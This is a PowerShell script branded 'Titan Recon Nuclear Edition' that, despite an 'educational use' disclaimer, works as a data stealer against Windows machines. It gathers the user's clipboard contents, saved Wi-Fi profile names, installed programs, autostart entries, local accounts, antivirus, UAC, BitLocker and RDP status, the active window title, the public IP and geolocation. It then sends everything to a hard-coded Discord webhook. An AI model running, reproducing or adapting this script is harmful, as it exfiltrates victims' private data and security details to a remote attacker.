# === TITAN RECON NUCLEAR EDITION | EXTREME POWER SHELL RECON ===
# USE THIS SCRIPT FOR EDUCATIONAL/TEST PURPOSES ON YOUR OWN SYSTEM OR IN A SECURE VM.
# Unauthorized use is strictly prohibited.

# === CONFIGURATION ===
$webhook = "https://discord.com/api/webhooks/1359970733429620927/CXCFV8__0FTCs0e3FHBtQKXHeCqN7KJA-Dh3Ew32kh1De0eAEXzv6synTOBQpOPf-l-E"

# ------------------------
# BASIC SYSTEM INFO
# ------------------------
$UserName        = $env:USERNAME
$ComputerName    = $env:COMPUTERNAME
$OSInfo          = (Get-CimInstance Win32_OperatingSystem).Caption
try {
    $IPInfo = (Invoke-RestMethod -Uri "https://api.ipify.org/?format=json").ip
} catch {
    $IPInfo = "Unavailable"
}
$CurrentTime     = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")

# ------------------------
# SYSTEM UPTIME
# ------------------------
try {
    $boot = (Get-CimInstance Win32_OperatingSystem).LastBootUpTime
    $LastBootTime = [Management.ManagementDateTimeConverter]::ToDateTime($boot)
    $UpTime = (New-TimeSpan -Start $LastBootTime).ToString("dd\.hh\:mm\:ss")
} catch {
    $UpTime = "Not Available"
}

# ------------------------
# CLIPBOARD CONTENT
# ------------------------
Add-Type -AssemblyName System.Windows.Forms
try {
    $ClipboardContent = [System.Windows.Forms.Clipboard]::GetText()
    if (-not $ClipboardContent) { $ClipboardContent = "No content available" }
} catch {
    $ClipboardContent = "Could not retrieve clipboard data."
}
if ($ClipboardContent.Length -gt 1024) {
    $ClipboardContent = $ClipboardContent.Substring(0,1020) + "..."
}

# ------------------------
# TOP 3 PROCESSES BY MEMORY USAGE
# ------------------------
$TopProcesses = Get-Process | Sort-Object WorkingSet -Descending | Select-Object -First 3
$ProcessInfo = ""
foreach ($Proc in $TopProcesses) {
    $MemoryMB = [math]::Round($Proc.WorkingSet / 1MB, 2)
    $ProcessInfo += "$($Proc.ProcessName): $MemoryMB MB`n"
}
if (-not $ProcessInfo) { $ProcessInfo = "No process info available." }
if ($ProcessInfo.Length -gt 1024) {
    $ProcessInfo = $ProcessInfo.Substring(0,1020) + "..."
}

# ------------------------
# INSTALLED PROGRAMS (from registry)
# ------------------------
try {
    $regPaths = @(
        "HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*",
        "HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*"
    )
    $InstalledPrograms = foreach ($path in $regPaths) {
        Get-ItemProperty $path -ErrorAction SilentlyContinue
    }
    $InstalledPrograms = $InstalledPrograms | Where-Object { $_.DisplayName } | Sort-Object DisplayName
    $ProgramsList = ($InstalledPrograms | ForEach-Object { "$($_.DisplayName) ($($_.DisplayVersion))" }) -join "`n"
    if (-not $ProgramsList) { $ProgramsList = "No installed programs found." }
    if ($ProgramsList.Length -gt 1024) {
        $ProgramsList = $ProgramsList.Substring(0,1020) + "..."
    }
} catch {
    $ProgramsList = "Error retrieving installed programs."
}

# ------------------------
# AUTO-START ENTRIES (Registry Run keys)
# ------------------------
try {
    $RunKeys = @(
        "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run",
        "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"
    )
    $AutoStarts = foreach ($key in $RunKeys) {
        Get-ItemProperty -Path $key -ErrorAction SilentlyContinue
    }
    $AutoStarts = $AutoStarts | ForEach-Object {
        $_ | Get-Member -MemberType NoteProperty | ForEach-Object { "$($_.Name): $($_.Definition)" }
    }
    $AutoStartsList = ($AutoStarts) -join "`n"
    if (-not $AutoStartsList) { $AutoStartsList = "No auto-start entries found." }
    if ($AutoStartsList.Length -gt 1024) {
        $AutoStartsList = $AutoStartsList.Substring(0,1020) + "..."
    }
} catch {
    $AutoStartsList = "Error retrieving auto-start entries."
}

# ------------------------
# SAVED WIFI NETWORKS (using netsh)
# ------------------------
try {
    $WifiProfilesRaw = netsh wlan show profiles 2>$null
    $WifiProfiles = ($WifiProfilesRaw | Select-String "All User Profile" | ForEach-Object { ($_ -split ":")[1].Trim() }) -join ", "
    if (-not $WifiProfiles) { $WifiProfiles = "No Wi-Fi profiles found." }
    if ($WifiProfiles.Length -gt 1024) {
        $WifiProfiles = $WifiProfiles.Substring(0,1020) + "..."
    }
} catch {
    $WifiProfiles = "Error retrieving Wi-Fi profiles."
}

# ------------------------
# RUNNING SERVICES
# ------------------------
try {
    $RunningServices = Get-Service | Where-Object { $_.Status -eq "Running" } | ForEach-Object { $_.Name } -join ", "
    if (-not $RunningServices) { $RunningServices = "No running services found." }
    if ($RunningServices.Length -gt 1024) {
        $RunningServices = $RunningServices.Substring(0,1020) + "..."
    }
} catch {
    $RunningServices = "Error retrieving services."
}

# ------------------------
# LOCAL USERS
# ------------------------
try {
    if (Get-Command Get-LocalUser -ErrorAction SilentlyContinue) {
        $LocalUsers = Get-LocalUser | ForEach-Object { $_.Name } -join ", "
    } else {
        $LocalUsers = (Get-WmiObject Win32_UserAccount -Filter "LocalAccount='True'" | ForEach-Object { $_.Name }) -join ", "
    }
    if (-not $LocalUsers) { $LocalUsers = "No local users found." }
    if ($LocalUsers.Length -gt 1024) {
        $LocalUsers = $LocalUsers.Substring(0,1020) + "..."
    }
} catch {
    $LocalUsers = "Error retrieving local users."
}

# ------------------------
# RDP STATUS (Registry check)
# ------------------------
try {
    $RDPStatus = Get-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -ErrorAction SilentlyContinue
    if ($RDPStatus.fDenyTSConnections -eq 0) { $RDPEnabled = "Enabled" } else { $RDPEnabled = "Disabled" }
} catch {
    $RDPEnabled = "Unavailable"
}

# ------------------------
# DRIVE INFORMATION
# ------------------------
try {
    $Drives = Get-PSDrive -PSProvider FileSystem | ForEach-Object { "$($_.Name): Total=$([math]::Round($_.Used + $_.Free,2))GB Free=$([math]::Round($_.Free,2))GB" } -join "`n"
    if (-not $Drives) { $Drives = "No drive information found." }
    if ($Drives.Length -gt 1024) {
        $Drives = $Drives.Substring(0,1020) + "..."
    }
} catch {
    $Drives = "Error retrieving drive info."
}

# ------------------------
# BATTERY INFORMATION
# ------------------------
try {
    $Battery = Get-WmiObject -Class Win32_Battery -ErrorAction SilentlyContinue
    if ($Battery) {
        $BatteryInfo = "EstimatedChargeRemaining: $($Battery.EstimatedChargeRemaining)%"
    } else {
        $BatteryInfo = "No battery information found."
    }
} catch {
    $BatteryInfo = "Error retrieving battery info."
}

# ------------------------
# SCHEDULED TASKS
# ------------------------
try {
    if (Get-Command Get-ScheduledTask -ErrorAction SilentlyContinue) {
        $ScheduledTasks = (Get-ScheduledTask | Select-Object -First 5 | ForEach-Object { $_.TaskName }) -join ", "
    } else {
        $ScheduledTasks = "Scheduled Tasks cmdlet not available."
    }
} catch {
    $ScheduledTasks = "Error retrieving scheduled tasks."
}

# ------------------------
# CURRENT ACTIVE WINDOW TITLE
# ------------------------
try {
    $sig = @"
using System;
using System.Runtime.InteropServices;
public class GetActiveWindowTitle {
    [DllImport("user32.dll", SetLastError = true)]
    public static extern IntPtr GetForegroundWindow();
    [DllImport("user32.dll", SetLastError=true, CharSet=CharSet.Auto)]
    public static extern int GetWindowText(IntPtr hWnd, System.Text.StringBuilder text, int count);
    public static string GetActiveWindowTitleMethod(){
        const int nChars = 256;
        System.Text.StringBuilder Buff = new System.Text.StringBuilder(nChars);
        IntPtr handle = GetForegroundWindow();
        if(GetWindowText(handle, Buff, nChars) > 0){
            return Buff.ToString();
        }
        return "Unavailable";
    }
}
"@
    Add-Type $sig
    $ActiveWindow = [GetActiveWindowTitle]::GetActiveWindowTitleMethod()
} catch {
    $ActiveWindow = "Error retrieving active window title."
}

# ------------------------
# ANTIVIRUS STATUS
# ------------------------
try {
    $AVProducts = Get-WmiObject -Namespace "root\SecurityCenter2" -Class AntiVirusProduct -ErrorAction SilentlyContinue
    if ($AVProducts) {
        $AVStatus = ($AVProducts | ForEach-Object { $_.displayName + " (" + $_.productState + ")" }) -join ", "
    } else {
        $AVStatus = "No antivirus products detected."
    }
    if ($AVStatus.Length -gt 1024) {
        $AVStatus = $AVStatus.Substring(0,1020) + "..."
    }
} catch {
    $AVStatus = "Error retrieving antivirus status."
}

# ------------------------
# HARDWARE INFO (CPU, RAM, etc.)
# ------------------------
try {
    $CPU = (Get-CimInstance Win32_Processor).Name
    $RAM = "{0:N2} GB" -f ((Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory / 1GB)
    $HardwareInfo = "CPU: $CPU`nRAM: $RAM"
    if ($HardwareInfo.Length -gt 1024) {
        $HardwareInfo = $HardwareInfo.Substring(0,1020) + "..."
    }
} catch {
    $HardwareInfo = "Error retrieving hardware info."
}

# ------------------------
# GEO-LOCATION FROM PUBLIC IP
# ------------------------
try {
    $GeoData = Invoke-RestMethod -Uri "http://ip-api.com/json/$IPInfo" -ErrorAction SilentlyContinue
    if ($GeoData.status -eq "success") {
        $GeoLocation = "Country: $($GeoData.country)`nRegion: $($GeoData.regionName)`nCity: $($GeoData.city)"
    } else {
        $GeoLocation = "Geo data unavailable."
    }
    if ($GeoLocation.Length -gt 1024) {
        $GeoLocation = $GeoLocation.Substring(0,1020) + "..."
    }
} catch {
    $GeoLocation = "Error retrieving geo-location."
}

# ------------------------
# NEW: MEMORY SUMMARY (Total & Free Memory)
# ------------------------
try {
    $OSData = Get-CimInstance Win32_OperatingSystem
    $TotalMemory = [math]::Round($OSData.TotalVisibleMemorySize / 1MB, 2)
    $FreeMemory = [math]::Round($OSData.FreePhysicalMemory / 1MB, 2)
    $MemorySummary = "Total Memory: $TotalMemory MB`nFree Memory: $FreeMemory MB"
} catch {
    $MemorySummary = "Memory data unavailable."
}

# ------------------------
# NEW: NETWORK ADAPTERS INFO
# ------------------------
try {
    $Adapters = Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias "Ethernet*", "Wi-Fi*" -ErrorAction SilentlyContinue
    if ($Adapters) {
        $AdaptersInfo = ($Adapters | ForEach-Object { "$($_.InterfaceAlias): $($_.IPAddress)" }) -join "`n"
        if (-not $AdaptersInfo) { $AdaptersInfo = "No active IPv4 adapters found." }
    } else {
        $AdaptersInfo = "No active IPv4 adapters found."
    }
} catch {
    $AdaptersInfo = "No active IPv4 adapters found."
}

# ------------------------
# SYSTEM SNAPSHOT BLOCK (New Block #1)
# ------------------------
try {
    $WinBuild = (Get-CimInstance Win32_OperatingSystem).BuildNumber
} catch { $WinBuild = "Unavailable" }
try {
    $ProcArch = (Get-CimInstance Win32_Processor).AddressWidth
    $Architecture = "$ProcArch-bit"
} catch { $Architecture = "Unavailable" }
try {
    $UACReg = Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -ErrorAction SilentlyContinue
    if ($UACReg.EnableLUA -eq 1) { $UACStatus = "Enabled" } else { $UACStatus = "Disabled" }
} catch { $UACStatus = "Unavailable" }
try {
    $SecureBootState = (Get-CimInstance -ClassName Win32_ComputerSystem -ErrorAction SilentlyContinue).SecureBootState
    if ($SecureBootState -eq $true) { $SecureBootStatus = "Enabled" } else { $SecureBootStatus = "Disabled" }
} catch { $SecureBootStatus = "Unavailable" }
try {
    $BitLockerInfo = manage-bde -status C: 2>$null | Select-String "Conversion Status:" | ForEach-Object { $_.Line.Trim() }
    $BitLockerStatus = if ($BitLockerInfo) { $BitLockerInfo } else { "Unavailable" }
} catch { $BitLockerStatus = "Unavailable" }

$EmbedSnapshot = @{
    title = "System Snapshot"
    color = 11141120  # Dark blue
    fields = @(
        @{ name = "Windows Build"; value = $WinBuild; inline = $true },
        @{ name = "Architecture"; value = $Architecture; inline = $true },
        @{ name = "UAC Status"; value = $UACStatus; inline = $true },
        @{ name = "SecureBoot"; value = $SecureBootStatus; inline = $true },
        @{ name = "BitLocker Status"; value = $BitLockerStatus; inline = $false }
    )
    footer = @{ text = "Titan Recon - Nuclear Edition" }
    timestamp = (Get-Date).ToString("o")
}

# ------------------------
# DEVELOPER ENVIRONMENT BLOCK (New Block #2)
# ------------------------
$PythonStatus = if (Get-Command python.exe -ErrorAction SilentlyContinue) { "Available" } else { "Not Installed" }
$NodeStatus   = if (Get-Command node.exe -ErrorAction SilentlyContinue)   { "Available" } else { "Not Installed" }
$GitStatus    = if (Get-Command git.exe -ErrorAction SilentlyContinue)    { "Available" } else { "Not Installed" }
$VSCStatus    = if (Get-Command code.exe -ErrorAction SilentlyContinue)   { "Available" } else { "Not Installed" }
$WSLStatus    = if (Get-Command wsl.exe -ErrorAction SilentlyContinue)    { "Available" } else { "Not Installed" }
$AndroidStudioStatus = if (Test-Path "C:\Program Files\Android\Android Studio") { "Installed" } else { "Not Installed" }

$EmbedDevEnv = @{
    title = "Developer Environment"
    color = 255     # Blue
    fields = @(
        @{ name = "Python"; value = $PythonStatus; inline = $true },
        @{ name = "Node.js"; value = $NodeStatus; inline = $true },
        @{ name = "Git"; value = $GitStatus; inline = $true },
        @{ name = "VS Code"; value = $VSCStatus; inline = $true },
        @{ name = "WSL"; value = $WSLStatus; inline = $true },
        @{ name = "Android Studio"; value = $AndroidStudioStatus; inline = $true }
    )
    footer = @{ text = "Titan Recon - Nuclear Edition" }
    timestamp = (Get-Date).ToString("o")
}

# ------------------------
# ASSEMBLE DISCORD EMBEDS
# ------------------------
$EmbedBasic     = @{
    title = "System Recon - TS Dominance"
    color = 16711680
    fields = @(
        @{ name = "User"; value = $UserName; inline = $true },
        @{ name = "Computer"; value = $ComputerName; inline = $true },
        @{ name = "OS"; value = $OSInfo; inline = $true },
        @{ name = "External IP"; value = $IPInfo; inline = $true },
        @{ name = "Timestamp"; value = $CurrentTime; inline = $false }
    )
    footer = @{ text = "Titan Recon - PowerShell Wrath" }
    timestamp = (Get-Date).ToString("o")
}
$EmbedAdvanced  = @{
    title = "Extended System Information"
    color = 65280
    fields = @(
        @{ name = "Uptime (dd.hh:mm:ss)"; value = $UpTime; inline = $true },
        @{ name = "Clipboard Content"; value = $ClipboardContent; inline = $false },
        @{ name = "Top Processes (Memory)"; value = $ProcessInfo; inline = $false },
        @{ name = "Network Adapters"; value = $AdaptersInfo; inline = $false },
        @{ name = "Memory Summary"; value = $MemorySummary; inline = $false }
    )
    footer = @{ text = "Titan Recon - PowerShell Wrath" }
    timestamp = (Get-Date).ToString("o")
}
$EmbedDeep      = @{
    title = "Deep System Recon"
    color = 255
    fields = @(
        @{ name = "Installed Programs"; value = $ProgramsList; inline = $false },
        @{ name = "Auto-Start Entries"; value = $AutoStartsList; inline = $false },
        @{ name = "Saved Wi-Fi Networks"; value = $WifiProfiles; inline = $false },
        @{ name = "Running Services"; value = $RunningServices; inline = $false },
        @{ name = "Local Users"; value = $LocalUsers; inline = $false },
        @{ name = "RDP Status"; value = $RDPEnabled; inline = $true },
        @{ name = "Drive Info"; value = $Drives; inline = $false },
        @{ name = "Battery Info"; value = $BatteryInfo; inline = $true },
        @{ name = "Scheduled Tasks"; value = $ScheduledTasks; inline = $false },
        @{ name = "Active Window"; value = $ActiveWindow; inline = $true }
    )
    footer = @{ text = "Titan Recon - PowerShell Wrath" }
    timestamp = (Get-Date).ToString("o")
}
$EmbedSecurity  = @{
    title = "Security & Hardware Recon"
    color = 16776960
    fields = @(
        @{ name = "Antivirus Status"; value = $AVStatus; inline = $false },
        @{ name = "Hardware Info"; value = $HardwareInfo; inline = $false },
        @{ name = "Geo-Location"; value = $GeoLocation; inline = $false }
    )
    footer = @{ text = "KRYPTA © All rights reserved" }
    timestamp = (Get-Date).ToString("o")
}

# ------------------------
# FINAL PAYLOAD (All Embeds)
# ------------------------
$FinalPayload = @{
    embeds = @($EmbedBasic, $EmbedAdvanced, $EmbedDeep, $EmbedSecurity, $EmbedSnapshot, $EmbedDevEnv)
} | ConvertTo-Json -Depth 15

# DEBUG: Print payload for inspection
Write-Host "DEBUG: Final JSON Payload:" -ForegroundColor Yellow
Write-Host $FinalPayload

# ------------------------
# SEND DATA TO DISCORD
# ------------------------
try {
    Invoke-RestMethod -Uri $webhook -Method Post -Body $FinalPayload -ContentType 'application/json'
    Write-Host "`n[OK] TS Recon data successfully sent to Discord." -ForegroundColor Cyan
}
catch {
    Write-Host "`n[ERROR] Failed sending to webhook: $_" -ForegroundColor Red
}
